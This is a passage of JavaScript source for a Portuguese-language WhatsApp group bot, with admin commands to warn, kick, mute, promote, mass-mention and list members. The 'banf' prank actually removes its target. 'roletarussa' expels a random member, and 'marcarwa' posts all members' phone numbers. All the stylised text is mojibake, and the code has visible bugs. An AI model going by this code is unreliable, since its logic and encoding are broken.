}} else {amy.sendMessage(from, {text: `üëãüèª ùòºùôôùôöùô™ùô® ùô™ùô®ùô™ùôñÃÅùôßùôûùô§: [ @${menc_os2.split("@")[0]} ] - ùôëùô§ùôòùôöÃÇ ùôòùô§ùô¢ùô•ùô°ùôöùô©ùô§ùô™ 3 ùôñùôôùô´ùôöùôßùô©ùôöÃÇùô£ùôòùôûùôñùô®, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùôñ ùôñùôôùô¢ùôûùô£ùôûùô®ùô©ùôßùôñùôòÃßùôñÃÉùô§ ùôôùô§ ùôúùôßùô™ùô•ùô§ ùô•ùôñùôßùôñ ùô©ùôöùôß ùô£ùô§ùôòÃßùôñÃÉùô§ ùôôùô§ ùô¶ùô™ùôö ùôõùô§ùôû ùô§ùôòùô§ùôßùôßùôûùôôùô§.`, mentions: [menc_os2]})
await sleep(1500)
amy.groupParticipantsUpdate(from, [menc_os2], "remove")
var i = ADVT.indexOf(menc_os2); ADVT.splice(i, 3); setGp(dataGp)}}, 3000)
break

case 'rmadv': case 'rmvadv':
if(!isGroup) return reply(reply.msg.grupo)
if(!isAdmins) return reply(reply.msg.adm)
if(!menc_os2) return reply("ùôëùô§ùôòùôöÃÇ ùôöùô®ùô¶ùô™ùôöùôòùôöùô™ ùôôùôö ùô¢ùôöùô£ùôòùôûùô§ùô£ùôñùôß ùô§ ùôñùô°ùô´ùô§ ùôñùô•ùô§ÃÅùô® ùô§ ùôòùô§ùô¢ùôñùô£ùôôùô§ üôÑ")
reagir(from, 'ü•∫')
adv = dataGp[0].advertir.map(i => i).indexOf(menc_os2)
if(adv < 0) return reply("ùôÄùô®ùô©ùôö ùô™ùô®ùô™ùôñÃÅùôßùôûùô§ ùô£ùôñÃÉùô§ ùôòùô§ùô£ùô©ùôöÃÅùô¢ ùô£ùôöùô£ùôùùô™ùô¢ùôñ ùôñùôôùô´ùôöùôßùô©ùôöÃÇùô£ùôòùôûùôñ ùô£ùô§ ùôúùôßùô™ùô•ùô§ üë©üèª‚Äçüíª")
dataGp[0].advertir.splice(adv, 1)
setGp(dataGp)
reply("ùòº ùôñùôôùô´ùôöùôßùô©ùôöÃÇùô£ùôòùôûùôñ ùôôùô§ ùô™ùô®ùô™ùôñÃÅùôßùôûùô§ ùô£ùôöùô®ùô©ùôö ùôúùôßùô™ùô•ùô§ ùôõùô§ùôû ùôßùôöùô©ùôûùôßùôñùôôùôñ ùôòùô§ùô¢ ùô®ùô™ùôòùôöùô®ùô®ùô§ !")
break

case 'ban': case 'kick':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('ùôàùôñùôßùô¶ùô™ùôö ùôñ ùô¢ùôöùô£ùô®ùôñùôúùôöùô¢ ùôôùôñ ùô•ùôöùô®ùô®ùô§ùôñ ùô¶ùô™ùôö ùôôùôöùô®ùôöùôüùôñ ùôóùôñùô£ùôûùôß üö´')
if(info.message.extendedTextMessage.contextInfo.participant !== null && info.message.extendedTextMessage.contextInfo.participant != undefined && info.message.extendedTextMessage.contextInfo.participant !== "") {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
let responseb = await amy.groupParticipantsUpdate(from, [mentioned], 'remove')
if (responseb[0].status === "200") return reply(`ùôêùô®ùô™ùôñùôßùôûùô§ ùôßùôöùô¢ùô§ùô´ùôûùôôùô§ ùôôùô§ ùôúùôßùô™ùô•ùô§ ùôòùô§ùô¢ ùô®ùô™ùôòùôöùô®ùô®ùóº`)
else if (responseb[0].status === "406") return reply('ùôâùôñùô§ ùô•ùô§ùô®ùô®ùô§ ùôßùôöùô¢ùô§ùô´ùôöùôß ùôöùô®ùô©ùôñ ùô•ùôöùô®ùô®ùô§ùôñ,ùô•ùô§ùôûùô® ùôöùô°ùôö ùôö ùô§ ùôòùôßùôûùôñùôôùô§ùôß ùôôùô§ ùôúùôßùô™ùô•ùô§ ')
else if (responseb[0].status === "404") return reply('ùôÄùô®ùô©ùôö ùô™ùô®ùô™ùôñùôßùôûùô§ ùôüùôñ ùôõùô§ùôû ùôßùôöùô¢ùô§ùô´ùôûùôôùô§ ùô§ùô™ ùô®ùôñùôûùô™ ùôôùô§ ùôúùôßùô™ùô•ùô§ ‚ùï')
else return reply('ùô©ùôöùô£ùô©ùôö ùô£ùô§ùô´ùôñùô¢ùôöùô£ùô©ùôö ùô•ùô§ùôß ùôõùôñùô´ùô§ùôß ‚ùï')
} else if (info.message.extendedTextMessage.contextInfo.mentionedJid != null && info.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(mentioned.length > 1) {
if(mentioned.length > groupMembers.length || mentioned.length === groupMembers.length || mentioned.length > groupMembers.length - 3) return reply(`ùôëùôñùôû ùôñùôßùô¶ùô™ùôûùô´ùôñùôß ùô§ ùôúùôßùô™ùô•ùô§ ùô¢ùôöùô®ùô¢ùô§ ùô•ùôñùôßùôòùôöùôûùôßùô§(ùôñ) ?`)
sexocomrato = 0
for (let banned of mentioned) {
await sleep(100)
let responseb2 = await amy.groupParticipantsUpdate(from, [banned], 'remove')
if (responseb2[0].status === "200") sexocomrato = sexocomrato + 1
}
return reply(``)
} else {
let responseb3 = await amy.groupParticipantsUpdate(from, [mentioned[0]], 'remove')
if (responseb3[0].status === "200") return reply(`ùôêùô®ùô™ùôñùôßùôûùô§ ùôßùôöùô¢ùô§ùô´ùôûùôôùô§ ùôôùô§ ùôúùôßùô™ùô•ùô§ ùôòùô§ùô¢ ùô®ùô™ùôòùôöùô®ùô®ùô§üë©üèª‚Äçüíª`)
else if (responseb3[0].status === "406") return reply('ùôâùôñùô§ ùô•ùô§ùô®ùô®ùô§ ùôßùôöùô¢ùô§ùô´ùôöùôß ùôöùô®ùô©ùôñ ùô•ùôöùô®ùô®ùô§ùôñ,ùô•ùô§ùôûùô® ùôöùô°ùôö ùôö ùô§ ùôòùôßùôûùôñùôôùô§ùôß ùôôùô§ ùôúùôßùô™ùô•ùô§ ')
else if (responseb3[0].status === "404") return reply(' ùôÄùô®ùô©ùôö ùô™ùô®ùô™ùôñùôßùôûùô§ ùôüùôñÃÅ ùôõùô§ùôû ùôßùôöùô¢ùô§ùô´ùôûùôôùô§ ùô§ùô™ ùô®ùôñùôûùô™ ‚ùï')
else return reply('ùôèùôöùô£ùô©ùôö ùô£ùô§ùô´ùôñùô¢ùôöùô£ùô©ùôö ùô•ùô§ùôß ùôõùôñùô´ùô§ùôß ‚ùï')
}
}
break;

case 'banf':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
reagir(from, "ü•∫")
await sleep(1000)
Test = [
`Eliminando membro @${menc_os2.split("@")[0]} em 10...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 9...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 8...`,
`Eliminado membro @${menc_os2.split("@")[0]} em 7...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 6...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 5...`,
`Eliminando membro @${menc_os2.split("@")[0]} em 4...`,
`Eliminado membro @${menc_os2.split("@")[0]} em 3...`,
`Eliminado membro @${menc_os2.split("@")[0]} em 2...`,
`Eliminado membro @${menc_os2.split("@")[0]} em 1...`,
`üëª Buuuuh @${menc_os2.split("@")[0]}, se assustou trouxa ü§£`
]
let { key } = await amy.sendMessage(from, {text: `Iniciando a contagem regressiva para seu banimento @${menc_os2.split("@")[0]}...`, mentions: [menc_os2]}, {quoted: info}) 
await sleep(2000)
for (let i = 0; i < Test.length; i++) {
await amy.sendMessage(from, {text: Test[i], edit: key , mentions: [menc_os2]}, {quoted: info});
await sleep (12000)
amy.groupParticipantsUpdate(from, [menc_os2], 'remove')
}
break;
case 'roletarussa':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
jds = []
 A2 = groupMembers
 B2 = groupMembers
 TAMBOR = ["ùô£ùôñ ùô•ùôöùôßùô£ùôñ.","ùô£ùôñ ùôòùôñùôóùôöùôòÃßùôñ.","ùô£ùô§ ùô•ùôöùô®ùôòùô§ùôòÃßùô§.","ùô£ùô§ ùô•ùôöùôûùô©ùô§.","ùô£ùô§ ùô§ùô°ùôùùô§.","ùô£ùô§ ùôöùô®ùô©ùô§ÃÇùô¢ùôñùôúùô§.","ùô£ùôñ ùôóùô§ùôòùôñ.","ùô£ùô§ ùôØùô§ùô´ùô§","ùô£ùôñ ùô©ùôöùô®ùô©ùôñ.","ùô£ùô§ ùôóùôßùôñùôòÃßùô§."]
  C2 = A2[Math.floor(Math.random() * A2.length)]
if(C2 === sender || C2 === numeroBot+"@s.whatsapp.net") {
return reply(`ùôÄùô®ùôòùô§ùô°ùôùùôû @${C2.id.split('@')[0]} ùô¢ùôñùô® ùôûùô£ùôõùôöùô°ùôûùôØùô¢ùôöùô£ùô©ùôö ùôòùô§ùôßùôßùôöùô™ ùôôùôö ùôòùô§ùô´ùôñùôßùôôùôûùôñ üòë `)
}
 tpa = TAMBOR[Math.floor(Math.random() * (TAMBOR.length))]	 		
 reply(`ùòº ùôöùô®ùôòùô§ùô°ùôùùôñ ùôöÃÅ ùô¢ùôûùô£ùôùùôñ! 1 ùô¢ùôöùô¢ùôóùôßùô§ ùôûùôßùôñÃÅ ùô¢ùô§ùôßùôßùôöùôß, ùô¶ùô™ùôö ùô§ùô® ùôüùô§ùôúùô§ùô® ùôòùô§ùô¢ùôöùôòùôöùô¢ üòà`)
 setTimeout( () => {
D1 = ` ùôåùô™ùôö ùô•ùôöùô£ùôñ... ùô´ùô§ùôòùôöÃÇ ùô£ùôñÃÉùô§ ùô®ùô§ùôóùôßùôöùô´ùôûùô´ùôöùô™ ùôñùô§ ùô¢ùôöùô™ ùôüùô§ùôúùô§ @${C2.id.split('@')[0]}, ùôùùô§ùôßùôñ ùôôùôö ùôöùô£ùô©ùôöùôßùôßùôñùôß ùô§ ùôòùôñùôôùôñÃÅùô´ùôöùôß, ùôûùô£ùôõùôöùô°ùôûùôØùô¢ùôöùô£ùô©ùôö ùô¢ùô§ùôßùôßùôöùô™ ùôòùô§ùô¢ ùô©ùôûùôßùô§ ${tpa}`             			
mentions(D1, jds, true)
}, 5000)
 jds.push(C2.id)				  
setTimeout( () => {
jds.push(C2.id)
amy.groupParticipantsUpdate(from, [C2.id], "remove")
}, 6000) 
break

case 'nomegp':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (!q) return reply(` `);
amy.groupUpdateSubject(from, `${q}`)
reply('nome gp alterado com sucesso '); 
break;           

case 'descgp':
case 'descri√ß√£ogp': 
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (!q) return reply(` `);
amy.groupUpdateDescription(from, `${q}`)
amy.sendMessage(from, {text: ' ùôéùô™ùôòùôöùô®ùô®ùô§, ùô´ùô§ùôòùôö ùôñùô°ùô©ùôöùôßùô§ùô™ ùôñ ùôôùôöùô®ùôòùôßùôûùôòÃßùôñÃÉùô§ ùôôùô§ ùôúùôßùô™ùô•ùô§ ‚úÖ'}, {quoted: info})
break

case 'setfotogp':
case 'fotogp':  
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if(!isQuotedImage) return reply(`ùôêùô®ùôö: ${prefix + command} <ùôàùôñùôßùô¶ùô™ùôö ùô™ùô¢ùôñ ùôõùô§ùô©ùô§>`)
ftgp = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(ftgp.mimetype))
buffimg = await getFileBuffer(ftgp, 'image')
fs.writeFileSync(rane, buffimg)
medipp = rane 
amy.updateProfilePicture(from, {url: medipp})
reply(`ùôÅùô§ùô©ùô§ ùôôùô§ ùôúùôßùô™ùô•ùô§ ùôñùô°ùô©ùôöùôßùôñùôôùôñ ùôòùô§ùô¢ ùô®ùô™ùôòùôöùô®ùô®ùô§ ‚úÖ`) 
break

case 'rmfotogp': case 'rmfotogroup': {
setTimeout(() => {reagir(from, `üë©üèª‚Äçüíª`)}, 100)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
reply(`*A foto do grupo foi removida com sucesso ‚úÖ*`)
await amy.removeProfilePicture(from)
}
break

case 'ephemeral': case 'msgtemp': { 
setTimeout(() => {reagir(from, `üë©üèª‚Äçüíª`)}, 100)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (!q) return reply(`USE 1 PARA ATIVAR / 0 PARA DESATIVAR üë©üèª‚Äçüíª`)
if (args[0] === '1') {
reply(`‚úÖÔ∏è As mensagens tempor√°rias ativada com sucesso.`)
await amy.sendMessage(from, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
} else if (args[0] === '0') {
reply(`‚ùåÔ∏è As mensagens tempor√°rias desativada com sucesso.`)
await amy.sendMessage(from, { disappearingMessagesInChat: false })
}
}
break


case 'marcarwa':
reagir(from, "üôáüèª‚Äç‚ôÄÔ∏è")
await sleep(1000)
try {
if(!isGroup) return reply(reply.msg.grupo)
if(!isAdmins) return reply(reply.msg.adm)
if(q.includes(`${prefix}`)) return reply("ùôâùôñÃÉùô§ ùô•ùô§ùôôùôö ùô™ùô©ùôûùô°ùôûùôØùôñùôß ùôòùô§ùô¢ùôñùô£ùôôùô§ùô® ùô£ùôöùô®ùô®ùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ üë©üèª‚Äçüíª")
members_id = []
zeroteks = (args.length > 1) ? body.slice(10).trim() : ''
zeroteks += ''
for (let mem of groupMembers) {
zeroteks += `‚û¢ https://wa.me/${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
amy.sendMessage(from, {text: zeroteks}, {quoted: info})
} catch {
reply('ùôÄùôßùôßùô§ ùôñùô§ ùô¢ùôöùô£ùôòùôûùô§ùô£ùôñùôß ùô§ùô® ùô¢ùôöùô¢ùôóùôßùô§ùô® ùôôùô§ ùôúùôßùô™ùô•ùô§.')
}
break

case 'marcar':
reagir(from, "üôáüèª‚Äç‚ôÄÔ∏è")
await sleep(1000)
{
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
 let metadata = await amy.groupMetadata(from)
let teks = `‚Ä¢ ùôàùôöùô£ùôòùôûùô§ùô£ùôñùô£ùôôùô§ ùô§ùô® ùô¢ùôöùô¢ùôóùôßùô§ùô® ùôòùô§ùô¢ùô™ùô£ùô® ùôôùô§ ùôúùôßùô™ùô•ùô§. ${!q ? "" : `\nùôàùôöùô£ùô®ùôñùôúùôöùô¢: ${q}`}\n\n`
for (let mem of participants) {
teks += `‚û¢ @${mem.id.split('@')[0]}\n`
}
amy.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: info })
}
break


case 'mute': case 'm': case 'mutar':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
textin = args.join(" ")
if(!textin) return reply('‚ùïùôàùôñùôßùô¶ùô™ùôö ùô§ ùô£ùô™ÃÅùô¢ùôöùôßùô§ ùô¶ùô™ùôö ùôôùôöùô®ùôöùôüùôñ ùô¢ùô™ùô©ùôñùôß üë©üèª‚Äçüíª')
reagir(from, "ü§ê")
await sleep(1000)
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(isMuted) {
var ind = GroupsMutedActived.indexOf(from)
for (let _ of mentioned) {
teks = `üîá ùôêùô®ùô™ùôñÃÅùôßùôûùô§ ùô¢ùô™ùô©ùôñùôôùô§: @${_.split('@')[0]}
 ùòºùôòÃßùôñÃÉùô§ ùôôùô§ ùôñùôôùô¢: [ ${pushname} ] üë©üèª‚Äçüíª`
muted[ind].numbers.push(_)
}
fs.writeFileSync('./database/usuarios/muted.json', JSON.stringify(muted, null, 2))
teks += '\n-\nü§´ ùôäùô°ùôñ ùô¢ùôöùô¢ùôóùôßùô§ ùôòùôñùô®ùô§ ùô´ùô§ùôòùôöÃÇ ùôôùôöùôß ùô™ùô¢ ùô•ùôûùô™, ùô´ùô§ùôòùôöÃÇ ùô´ùôñùôû ùô®ùôöùôß ùôöùô°ùôûùô¢ùôûùô£ùôñùôôùô§ ùôôùô§ ùôúùôßùô™ùô•ùô§'
mentions(teks, mentioned, true)
} else {
 const data = {
jid: from,
numbers: mentioned
}
muted.push(data)
fs.writeFileSync('./database/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
for (let _ of mentioned) {
teks = `üîá ùôêùô®ùô™ùôñÃÅùôßùôûùô§ ùô¢ùô™ùô©ùôñùôôùô§:_* @${_.split('@')[0]}
 ùòºùôòÃßùôñÃÉùô§ ùôôùô§ ùôñùôôùô¢: [ ${pushname} ] üë©üèª‚Äçüíª`
}
teks += '\n-\n*ü§´ ùôäùô°ùôñ ùô¢ùôöùô¢ùôóùôßùô§ ùôòùôñùô®ùô§ ùô´ùô§ùôòùôöÃÇ ùôôùôöùôß ùô™ùô¢ ùô•ùôûùô™, ùô´ùô§ùôòùôöÃÇ ùô´ùôñùôû ùô®ùôöùôß ùôöùô°ùôûùô¢ùôûùô£ùôñùôôùô§ùôß  ùôôùô§ ùôúùôßùô™ùô•ùô§'
mentions(teks, mentioned, true)
}
break


case 'desmute': case 'unmute': case 'desmutar':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
textin = args.join(" ")
if(!textin) return reply('‚ùïùôàùôñùôßùô¶ùô™ùôö ùô§ ùô£ùô™ÃÅùô¢ùôöùôßùô§ ùô¶ùô™ùôö ùôôùôöùô®ùôöùôüùôñ ùôôùôöùô®ùô¢ùô™ùô©ùôñùôßüë©üèª‚Äçüíª')
reagir(from, "üì¢")
await sleep(1000)
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
var ind = GroupsMutedActived.indexOf(from)
if(isMuted) {
for(let _ of mentioned) {
if(muted[ind].numbers.indexOf(_) >= 0) {
var rmind = muted[ind].numbers.indexOf(_)
muted[ind].numbers.splice(rmind, 1)
}
}
fs.writeFileSync('./database/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
for (let _ of mentioned) {
teks = `üîä ùôêùô®ùô™ùôñÃÅùôßùôûùô§ ùôôùôöùô®ùô¢ùô™ùô©ùôñùôôùô§: @${_.split('@')[0]}
ùòºùôòÃßùôñÃÉùô§ ùôôùô§ ùôñùôôùô¢: [ ${pushname} ] üë©üèª‚Äçüíª`
}
teks += '\n-\nü§™ ùôñùôúùô§ùôßùôñ ùô´ùô§ùôòùôöÃÇ ùô•ùô§ùôôùôö ùôõùôñùô°ùôñùôß ùôñ ùô´ùô§ùô£ùô©ùôñùôôùôö ùô£ùô§ ùôúùôßùô™ùô•ùô§!'
mentions(teks, mentioned, true)
} else {
const data = {
jid: from,
numbers: []
}
muted.push(data)
fs.writeFileSync('./database/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
for (let _ of mentioned) {
teks = `üîä ùôêùô®ùô™ùôñÃÅùôßùôûùô§ ùôôùôöùô®ùô¢ùô™ùô©ùôñùôôùô§: @${_.split('@')[0]}
 ùòºùôòÃßùôñÃÉùô§ ùôôùô§ ùôñùôôùô¢: [ ${pushname} ] üë©üèª‚Äçüíª`
}
teks += '\n-\nü§™ ùòºùôúùô§ùôßùôñ ùô´ùô§ùôòùôöÃÇ ùô•ùô§ùôôùôö ùôõùôñùô°ùôñùôß ùôñ ùô´ùô§ùô£ùô©ùôñùôôùôö ùô£ùô§ ùôúùôßùô™ùô•ùô§!'
mentions(teks, mentioned, true)
}
break


case 'promover': case 'promote':
if (!isGroup) return reply(msg.grupo)
if (!isAdmins) return reply(msg.adm)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('ùôëùôñùôû ùôòùô§ùô°ùô§ùôòùôñùôß ùô§ ùô´ùôöùô£ùô©ùô§ ùôòùô§ùô¢ùô§ ùôñùôôùô¢ ùô¢ùôöùô®ùô¢ùô§ ?')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
let responsedm = await amy.groupParticipantsUpdate(from, [mentioned], 'promote')
if (responsedm[0].status === "200") return reply('ùôêùô®ùô™ùôñÃÅùôßùôûùô§ ùô•ùôßùô§ùô¢ùô§ùô´ùôûùôôùô§ ùôòùô§ùô¢ ùô®ùô™ùôòùôöùô®ùô®ùô§ ü•≥\n\nùóîùó±ùó∂ùó∫ùó∂ùóªùó∂ùòÄùòÅùóøùó≤ ùó∞ùóºùó∫ ùòÄùóÆùóØùó≤ùó±ùóºùóøùó∂ùóÆ, ùóºùòÇ ùòÄùó≤ùóøùóÆ ùóøùó≤ùóØùóÆùó∂ùòÖùóÆùó±ùóº üë©üèª‚Äçüíª')
else if (responsedm[0].status === "404") return reply('ùôÄùô®ùô®ùôö ùô™ùô®ùô™ùôñÃÅùôßùôûùô§ ùô£ùôñùô§ ùôöùô®ùô©ùôñÃÅ ùô£ùô§ ùôúùôßùô™ùô•ùô§ ü§î')
else return reply('ùôèùôöùô£ùô©ùôö ùô£ùô§ùô´ùôñùô¢ùôöùô£ùô©ùôö ùô•ùô§ùôß ùôõùôñùô´ùô§ùôß')
break


case 'rebaixar': case 'rebaixa':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('ùôàùôñùôßùô¶ùô™ùôö ùô§ùô™ ùôßùôöùô®ùô•ùô§ùô£ùôôùôñ ùôñ ùô¢ùôöùô£ùô®ùôñùôúùôöùô¢ ùôôùôö ùô¶ùô™ùôöùô¢ ùô´ùô§ùôòùôöÃÇ ùô¶ùô™ùôöùôß ùô©ùôûùôßùôñùôß ùôôùôö ùôñùôôùô¢ùôûùô£ ‚ùï')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
let responsepm = await amy.groupParticipantsUpdate(from, [mentioned], 'demote')
if (responsepm[0].status === "406") return reply(`ùôäùô°ùôñ ${pushname} ùô£ùôñùô§ ùô•ùô§ùô®ùô®ùô§ ùôßùôöùóØùóÆùó∂ùòÖùóÆùóø ùôöùô®ùô©ùóÆ ùô•ùôöùô®ùô®ùô§ùôñ, ùô•ùô§ùôûùô® ùôöùô°ùôö ùôö ùô§ ùôòùôßùôûùôñùôôùô§ùôß ùôôùô§ ùôúùôßùô™ùô•ùô§ üë©üèª‚Äçüíª`)
else if (responsepm[0].status === "200") return reply(`ùôëùô§ùôòùôö ùô•ùôöùôßùôôùôöùô™ ùô§ ùôòùôñùôßùôúùô§ ùôôùôö ùôñùôôùô¢ ùô•ùô§ùôß ùô¢ùô§ùô©ùôûùô´ùô§ùô® ùôüùô™ùô®ùô©ùô§, ùôáùôñùô¢ùôöùô£ùô©ùô§ ùô´ùô§ùôòùôö ùô£ùôñùô§ ùôö ùô¢ùôñùôûùô® ùôñùôôùô¢ ùôôùô§ ùôúùôßùô™ùô•ùô§ üòÇ`)
else if (responsepm[0].status === "404") return reply(' ùôÄùô®ùô®ùôö ùô™ùô®ùô™ùôñÃÅùôßùôûùô§ ùô£ùôñùô§ ùôöùô®ùô©ùôñÃÅ ùô£ùô§ ùôúùôßùô™ùô•ùô§ ü§î ')
else return reply('ùô©ùôöùô£ùô©ùôö ùô£ùô§ùô´ùôñùô¢ùôöùô£ùô©ùôö ùô•ùô§ùôß ùôõùôñùô´ùô§ùôß')
break

case 'totag':
case 'cita':
case 'hidetag':
if(!isGroup) return reply('ùóòùòÄùòÅùó≤ ùó∞ùóºùó∫ùóÆùóªùó±ùóº ùòÄùóºÃÅ ùó±ùó≤ùòÉùó≤ ùòÄùó≤ùóø ùòÇùòÅùó∂ùóπùó∂ùòáùóÆùó±ùóº ùó≤ùó∫ ùóöùóøùòÇùóΩùóº.')
if (!isAdmins && !isCreator) return reply('ùó©ùóºùó∞ùó≤ÃÇ ùóΩùóøùó≤ùó∞ùó∂ùòÄùóÆ ùòÄùó≤ùóø ùóîùóóùó† ùóΩùóøùóÆ ùòÇùòÅùó∂ùóπùó∂ùòáùóÆùóø ùó≤ùòÄùòÅùó≤ ùó∞ùóºùó∫ùóÆùóªùó±ùóº')
membros = (groupId, membros1) => {
array = []
for (let i = 0; i < membros1.length; i++) {
array.push(membros1[i].id)
}
return array
}
var yd = membros(from, groupMembers)
if((isMedia && !m.message.videoMessage || isQuotedSticker) && args.length == 0) {
media = isQuotedSticker ? m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage : m.message.stickerMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'sticker')
fs.writeFileSync(rane,img)
fig = fs.readFileSync(rane)
var options = {
sticker: fig,  
mentions: yd
}
amy.sendMessage(from, options)
} else if ((isMedia && !m.message.videoMessage || isQuotedImage) && args.length == 0) {
media = isQuotedImage ? m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : m.message.imageMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'image')
fs.writeFileSync(rane,img)
buff = fs.readFileSync(rane)
amy.sendMessage(from, {image: buff, mentions: yd}, {quoted: info})
} else if ((isMedia && !m.message.videoMessage || isQuotedVideo) && args.length == 0) {
media = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
rane = getRandom('.'+await getExtension(media.mimetype))
vid = await getFileBuffer(media, 'video')
fs.writeFileSync(rane,vid)
buff = fs.readFileSync(rane)
amy.sendMessage(from, {video: buff, mimetype: 'video/mp4',mentions: yd}, {quoted: info})
} else if ((isMedia && !m.message.videoMessage || isQuotedAudio) && args.length == 0) {
media = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
rane = getRandom('.'+await getExtension(media.mimetype))
aud = await getFileBuffer(media, 'audio')
fs.writeFileSync(rane,aud)
buff = fs.readFileSync(rane)
amy.sendMessage(from, {audio: buff, mimetype: 'audio/mp4', ptt:true,mentions: yd}, {quoted: info})
} else if ((isMedia && !m.message.videoMessage || isQuotedDocument) && args.length == 0) {
media = isQuotedDocument ? m.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : m.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(rane,doc)
buff = fs.readFileSync(rane)
amy.sendMessage(from, {document: buff, mimetype : 'text/plain',mentions: yd},{quoted: info})
} else if(body){
if(q.length < 1) return reply('ùóóùó∂ùó¥ùó∂ùòÅùó≤ ùóÆùóπùó¥ùóº ùóºùòÇ ùó∫ùóÆùóøùóæùòÇùó≤ ùóÆùóπùó¥ùòÇùó∫ùóÆ ùó∞ùóºùó∂ùòÄùóÆ ùóΩùóÆùóøùóÆ ùó∞ùó∂ùòÅùóÆùóø.')
amy.sendMessage(from, {text: body.slice(command.length + 2), mentions: yd})
} else {
reply(`ùó•ùó≤ùòÄùóΩùóºùóªùó±ùó≤ùóø ùó∂ùó∫ùóÆùó¥ùó≤ùó∫/ùó±ùóºùó∞ùòÇùó∫ùó≤ùóªùòÅùóº/ùó¥ùó∂ùó≥/ùó≥ùó∂ùó¥ùòÇùóøùó∂ùóªùóµùóÆùòÄ/ùóÆÃÅùòÇùó±ùó∂ùóº/ùòÉùó∂ÃÅùó±ùó≤ùóº ùó∞ùóºùó∫ ùóπùó≤ùó¥ùó≤ùóªùó±ùóÆ ${prefix + command}`)
}
break


case 'status':
if (!isGroup) return reply(reply.msg.grupo)
if (!isAdmins && !isCreator  && !m.key.fromMe) return reply(msg.adm)
reply(`‚ï≠‚ï∏‚ï∏‚ï∏‚ù≤ ùó¶ ùóß ùóî ùóß ùó® ùó¶ ‚ù≥‚ï∏‚ï∏‚ï∏‚ïÆ
‚îÇ‚û± ùóîùóªùòÅùó∂ùóÆùòÇùó±ùó∂ùóº: ${isAntiAudio? '‚úÖ' : '‚õî'}
‚îÇ‚û± ùóîùóªùòÅùó∂ùó±ùóºùó∞: ${isAntidoc ? '‚úÖ' : '‚õî'}
‚îÇ‚û± ùóîùóªùòÅùó∂ùó≥ùóÆùó∏ùó≤: ${isAntifake ? '‚úÖ' : '‚õî'}
‚îÇ‚û± ùóîùóªùòÅùó∂ùó∂ùó∫ùó¥: ${isAntiImg? '‚úÖ' : '‚õî'}
‚îÇ‚û± ùóîùóªùòÅùó∂ùòÄùòÅùó∂ùó∞ùó∏ùó≤ùóø: ${isAntiSticker ? '‚úÖ' : '‚õî'}
‚îÇ‚û± ùóîùóªùòÅùó∂ùóªùóºùòÅùóÆ: ${isAntiNotas ? '‚úÖ' : '‚õî'}
